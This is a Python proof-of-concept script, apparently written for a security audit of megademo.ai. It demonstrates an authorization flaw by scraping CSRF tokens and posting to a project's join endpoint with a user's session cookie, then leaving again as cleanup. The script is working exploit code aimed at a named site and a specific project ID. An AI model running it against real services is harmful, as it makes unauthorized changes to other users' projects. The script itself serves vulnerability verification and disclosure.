#!/usr/bin/env python3
"""Demonstrate that a normal user can join a public non-draft project without an invitation."""
import json
import os
import re
import sys
from urllib.parse import unquote

import requests

BASE_URL = os.environ.get('MEGADEMO_BASE_URL', 'https://megademo.ai')
DEFAULT_COOKIE = 'connect.sid=YOUR_SESSION_COOKIE_HERE'
COOKIE = os.environ.get('MEGADEMO_COOKIE', DEFAULT_COOKIE)
KNOWN_PROJECT_ID = '6a0471b5b0b4e4cb675f1799'
FALLBACK_SLUGS = ['testmatrixgenerate', 'anbox-test-pilot', 'lab-operator-skills']


def make_session():
    s = requests.Session()
    s.headers.update({'User-Agent': 'megademo-security-audit-poc/1.0', 'Cookie': COOKIE})
    return s


def extract(text, pattern, flags=re.S):
    match = re.search(pattern, text, flags)
    return match.group(1) if match else None


def parse_sid(cookie):
    decoded = unquote(cookie)
    match = re.search(r'connect\.sid=s:([^.]+)', decoded)
    return match.group(1) if match else 'unknown'


def try_join(session, project_id, csrf):
    return session.post(
        f'{BASE_URL}/projects/{project_id}/join',
        json={},
        headers={'x-csrf-token': csrf},
        timeout=20,
    )


def try_leave(session, project_id, csrf):
    return session.post(
        f'{BASE_URL}/projects/{project_id}/leave',
        json={},
        headers={'x-csrf-token': csrf},
        timeout=20,
    )


def find_safe_fallback(session):
    for slug in FALLBACK_SLUGS:
        response = session.get(f'{BASE_URL}/projects/{slug}', timeout=20)
        if response.status_code != 200:
            continue
        project_id = extract(response.text, r'data-project-id="([0-9a-f]{24})"')
        join_action = extract(response.text, r'action="([^"]+/join)"')
        leave_action = extract(response.text, r'action="([^"]+/leave)"')
        csrf = extract(response.text, r'name="_csrf" value="([^"]+)"') or extract(response.text, r'meta name="csrf-token" content="([^"]+)"')
        if project_id and join_action and not leave_action and csrf:
            return {'slug': slug, 'project_id': project_id, 'csrf': csrf}
    return None


def main():
    session = make_session()
    mine = session.get(f'{BASE_URL}/projects/mine', timeout=20)
    current_ids = set(re.findall(r'/projects/([0-9a-f]{24})/edit', mine.text))
    browse = session.get(f'{BASE_URL}/projects', timeout=20)
    generic_csrf = extract(browse.text, r'meta name="csrf-token" content="([^"]+)"')

    print(f'Base URL: {BASE_URL}')
    print(f'Authenticated SID: {parse_sid(COOKIE)}')
    print(f'Projects already on your account: {len(current_ids)}')
    print('')

    confirmed = False
    if generic_csrf:
        known = try_join(session, KNOWN_PROJECT_ID, generic_csrf)
        print(f'Known target POST /projects/{KNOWN_PROJECT_ID}/join -> {known.status_code}')
        print(known.text[:300])
        if known.ok and 'success' in known.text and KNOWN_PROJECT_ID not in current_ids:
            confirmed = True
            cleanup = try_leave(session, KNOWN_PROJECT_ID, generic_csrf)
            print(f'Cleanup leave -> {cleanup.status_code} {cleanup.text[:200]}')
        elif KNOWN_PROJECT_ID in current_ids:
            print('Note: the requested known project ID is already on the authenticated account, so it is not a clean takeover demonstration anymore.')
    else:
        print('Could not extract a CSRF token from /projects for the known-target probe.')

    if not confirmed:
        fallback = find_safe_fallback(session)
        if not fallback:
            print('NOT CONFIRMED: no safe fallback test project with a visible Join button was found.')
            return 1
        print('')
        print(f"Using fallback test project slug '{fallback['slug']}' (id {fallback['project_id']}) for a safe demo.")
        joined = try_join(session, fallback['project_id'], fallback['csrf'])
        print(f"POST /projects/{fallback['project_id']}/join -> {joined.status_code}")
        print(joined.text[:300])
        if joined.ok and 'success' in joined.text:
            confirmed = True
            cleanup = try_leave(session, fallback['project_id'], fallback['csrf'])
            print(f"Cleanup POST /projects/{fallback['project_id']}/leave -> {cleanup.status_code}")
            print(cleanup.text[:200])

    if confirmed:
        print()
        print("CONFIRMED: the join endpoint accepted an unsolicited membership change and returned a success response.")
        return 0

    print()
    print("NOT CONFIRMED: the server did not accept an unsolicited join request during this run.")
    return 1


if __name__ == '__main__':
    sys.exit(main())
